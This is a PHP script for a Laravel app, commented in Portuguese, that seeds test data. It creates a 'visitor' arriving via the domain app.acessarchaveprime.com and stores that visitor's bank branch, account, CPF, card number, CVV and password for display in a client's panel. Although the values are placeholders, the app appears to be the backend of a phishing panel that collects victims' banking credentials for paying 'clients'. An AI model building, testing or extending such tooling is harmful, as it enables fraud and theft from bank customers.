<?php

namespace App;

require __DIR__ . '/vendor/autoload.php';
$app = require_once __DIR__ . '/bootstrap/app.php';
$kernel = $app->make(Illuminate\Contracts\Console\Kernel::class);
$kernel->bootstrap();

use App\Models\Visitante;
use App\Models\InformacaoBancaria;
use App\Models\Usuario;
use App\Models\LinkGroupItem;
use App\Models\LinkGroup;
use App\Models\DnsRecord;
use Illuminate\Support\Facades\DB;

// 1. Encontrar o usuário (Cliente 1)
// Vamos buscar o usuário pelo nome ou identificador, como não temos certeza do ID específico
$usuario = Usuario::where('nivel_acesso', 'cliente')->where('ativo', 1)->first();

if (!$usuario) {
    echo "Não foi possível encontrar o Cliente 1.\n";
    exit(1);
}

echo "Cliente encontrado: " . $usuario->nome . " (ID: " . $usuario->id . ")\n";

// 2. Verificar se existe um registro DNS para o domínio app.acessarchaveprime.com
$dominio = 'app.acessarchaveprime.com';
$dnsRecord = DnsRecord::where('name', $dominio)->first();

if ($dnsRecord) {
    echo "Domínio encontrado: " . $dnsRecord->name . "\n";
} else {
    echo "Domínio não encontrado. Usando o cliente diretamente.\n";
}

// 3. Buscar ou criar um grupo de links para o usuário
$linkGroup = LinkGroup::firstOrCreate(
    ['usuario_id' => $usuario->id],
    [
        'title' => 'Links do Cliente ' . $usuario->id,
        'description' => 'Grupo de links automático',
    ]
);

echo "Grupo de links: " . $linkGroup->title . " (ID: " . $linkGroup->id . ")\n";

// 4. Buscar ou criar um link dentro do grupo
$linkItem = LinkGroupItem::firstOrCreate(
    [
        'link_group_id' => $linkGroup->id,
        'title' => 'Link do ' . $dominio
    ],
    [
        'url' => 'https://' . $dominio,
        'order' => 0,
        'active' => true
    ]
);

echo "Link criado/encontrado: " . $linkItem->title . " (ID: " . $linkItem->id . ")\n";

// 5. Criar um visitante
$visitante = Visitante::create([
    'usuario_id' => $usuario->id,
    'link_id' => $linkItem->id,
    'ip' => '192.168.1.100',
    'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'referrer' => 'https://google.com'
]);

echo "Visitante criado com UUID: " . $visitante->uuid . "\n";

// 6. Criar informações bancárias para o visitante
$informacao = InformacaoBancaria::create([
    'visitante_uuid' => $visitante->uuid,
    'data' => now(),
    'agencia' => '1234',
    'conta' => '56789-0',
    'cpf' => '123.456.789-00',
    'nome_completo' => 'Visitante de Teste',
    'telefone' => '(11) 98765-4321',
    'informacoes_adicionais' => [
        'cartao' => '1234 5678 9012 3456',
        'cvv' => '123',
        'senha' => 'senha123',
        'observacoes' => 'Esse é um teste para o Cliente 1 a partir do domínio ' . $dominio
    ]
]);

echo "Informações bancárias criadas com ID: " . $informacao->id . "\n";
echo "\nProcesso concluído com sucesso!\n";
echo "O visitante e suas informações bancárias agora podem ser visualizados no painel do Cliente 1.\n";
?>
